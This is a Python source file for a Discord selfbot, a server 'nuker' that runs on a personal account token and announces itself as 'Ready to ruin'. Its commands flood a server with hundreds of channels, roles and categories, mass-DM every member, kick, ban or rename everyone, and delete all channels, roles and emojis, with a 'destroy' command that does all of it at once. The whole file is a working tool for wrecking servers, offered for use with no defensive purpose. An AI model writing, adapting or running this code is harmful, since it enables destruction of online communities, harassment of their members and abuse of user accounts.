# -*- coding: utf-8 -*-
# CONFIG
# ---------
token = input("Your Discord Token:") 
prefix = "~" # 
# ----------

import discord
import discord.client
import requests
import time
import random
import json
import shlex
import urllib
import secrets
from discord.ext import commands
from discord.ext import commands





print ("Loading..")

bot = commands.Bot(command_prefix=prefix, self_bot=True)
bot.remove_command("help")


@bot.event
async def on_ready():
    print ("Ready to ruin >:)")


try:
    async def self_check(ctx):
        if bot.user.id == ctx.message.author.id:
            return True
        else:
            return False


    class MemberRoles(commands.MemberConverter):
      async def convert(self, ctx, argument):
        member = await super().convert(ctx, argument)
        return [role.name for role in member.roles[1:]]
    

    @bot.command()
    async def duck(ctx):
        duckimg = str(requests.get('https://random-d.uk/api/v1/random').json()['url'])
        await ctx.send(duckimg)


    @bot.command()
    async def ducks(ctx):
        for i in range(0, 499):
          print('Sending Image Of Duck')
          duckimg = str(requests.get('https://random-d.uk/api/v1/random').json()['url'])
          await ctx.send(duckimg)

    @commands.check(self_check)
    @bot.command()
    async def roles(ctx, *, member: MemberRoles):
        await ctx.send('I see the following roles: ' + ', '.join(member))

    @commands.check(self_check)
    @bot.command(pass_context=True)
    async def cchannels(ctx, string):
        guild = ctx.message.guild
        await ctx.message.delete()
        for i in range(0, 499):
            print ("The channel " + string + " has been created in " + ctx.guild.name)
            await guild.create_text_channel(string)

    @commands.check(self_check)
    @bot.command(pass_context=True)
    async def croles(ctx, string):
        guild = ctx.guild
        colour = discord.Colour(0xFF0000)
        await ctx.message.delete()
        print ("The role " + string + " has been created in " + ctx.guild.name)
        for x in range(0, 250):
           await guild.create_role(name=string, colour=discord.Colour(0xFF0000))

    @commands.check(self_check)
    @bot.command(pass_context=True)
    async def ccategories(ctx, string):
        guild = ctx.message.guild
        print ("The category " + string + " has been created in " + ctx.guild.name)
        await ctx.message.delete()
        for x in range(0, 499):
          await guild.create_category(string)

    @bot.command(pass_context=True)
    async def cvoices(ctx, string):
        guild = ctx.message.guild
        print ("The voice channel " + string + " has been created in " + ctx.guild.name)
        await ctx.message.delete()
        for x in range(0, 499): 
          await guild.create_voice_channel(string)

    @commands.check(self_check)
    @bot.command(pass_context=True)
    async def kall(ctx):
        await ctx.message.delete()
        for user in list(ctx.guild.members):
            try:
                await ctx.guild.kick(user)
                print (f"{user.name} has been kicked from {ctx.guild.name}")
            except:
                print (f"{user.name} has FAILED to be kicked from {ctx.guild.name}")
        print ("Action Completed: kall")
    # Kicks every member in a server.

    @commands.check(self_check)
    @bot.command(pass_context=True)
    async def ball(ctx):
        await ctx.message.delete()
        for user in list(ctx.guild.members):
            try:
                await ctx.guild.ban(user)
                print (f"{user.name} has been banned from {ctx.guild.name}")
            except:
                print (f"{user.name} has FAILED to be banned from {ctx.guild.name}")
        print ("Action Completed: ball")  

    @commands.check(self_check)
    @bot.command(pass_context=True)
    async def rall(ctx, rename_to):
        await ctx.message.delete()
        for user in list(ctx.guild.members):
            try:
                await user.edit(nick=rename_to)
                print (f"{user.name} has been renamed to {rename_to} in {ctx.guild.name}")
            except:
                print (f"{user.name} has NOT been renamed to {rename_to} in {ctx.guild.name}")
        print ("Action Completed: rall")

    @commands.check(self_check)
    @bot.command(pass_context=True)
    async def mall(ctx, *, message):
        await ctx.message.delete()
        for user in ctx.guild.members:
            try:
                await user.send(message)
                print(f"{user.name} has recieved the message.")
            except:
                print(f"{user.name} has NOT recieved the message.")
        print("Action Completed: mall")

    @commands.check(self_check)
    @bot.command(pass_context=True)
    async def dall(ctx, condition):
        if condition.lower() == "channels":
            for channel in list(ctx.guild.channels):
                try:
                    await channel.delete()
                    print (f"{channel.name} has been deleted in {ctx.guild.name}")
                except:
                    print (f"{channel.name} has NOT been deleted in {ctx.guild.name}")
            print ("Action Completed: dall channels")
        elif condition.lower() == "roles":
            for role in list(ctx.guild.roles):
                try:
                    await role.delete()
                    print (f"{role.name} has been deleted in {ctx.guild.name}")
                except:
                    print (f"{role.name} has NOT been deleted in {ctx.guild.name}")
            print ("Action Completed: dall roles")
        elif condition.lower() == "emojis":
            for emoji in list(ctx.guild.emojis):
                try:
                    await emoji.delete()
                    print (f"{emoji.name} has been deleted in {ctx.guild.name}")
                except:
                    print (f"{emoji.name} has NOT been deleted in {ctx.guild.name}")
            print ("Action Completed: dall emojis")
        elif condition.lower() == "all":
            for channel in list(ctx.guild.channels):
                try:
                    await channel.delete()
                    print (f"{channel.name} has been deleted in {ctx.guild.name}")
                except:
                    print (f"{channel.name} has NOT been deleted in {ctx.guild.name}")
            for role in list(ctx.guild.roles):
                try:
                    await role.delete()
                    print (f"{role.name} has been deleted in {ctx.guild.name}")
                except:
                    print (f"{role.name} has NOT been deleted in {ctx.guild.name}")
            for emoji in list(ctx.guild.emojis):
                try:
                    await emoji.delete()
                    print (f"{emoji.name} has been deleted in {ctx.guild.name}")
                except:
                    print (f"{emoji.name} has NOT been deleted in {ctx.guild.name}")
            print ("Action Completed: dall all")

    @commands.check(self_check)
    @bot.command(pass_context=True)
    async def destroy(ctx):
        await ctx.message.delete()
        for emoji in list(ctx.guild.emojis):
            try:
                await emoji.delete()
                print (f"{emoji.name} has been deleted in {ctx.guild.name}")
            except:
                print (f"{emoji.name} has NOT been deleted in {ctx.guild.name}")
        for channel in list(ctx.guild.channels):
            try:
                await channel.delete()
                print (f"{channel.name} has been deleted in {ctx.guild.name}")
            except:
                print (f"{channel.name} has NOT been deleted in {ctx.guild.name}")
        for role in list(ctx.guild.roles):
            try:
                await role.delete()
                print (f"{role.name} has been deleted in {ctx.guild.name}")
            except:
                print (f"{role.name} has NOT been deleted in {ctx.guild.name}")
        for user in list(ctx.guild.members):
            try:
                await ctx.guild.ban(user)
                print (f"{user.name} has been banned from {ctx.guild.name}")
            except:
                print (f"{user.name} has FAILED to be banned from {ctx.guild.name}")
        print ("Action Completed: destroy")
    # Outright destroys a server.

except:
    pass

bot.run(token, bot=False)
# Starts the bot by passing it a token and telling it it isn't really a bot.
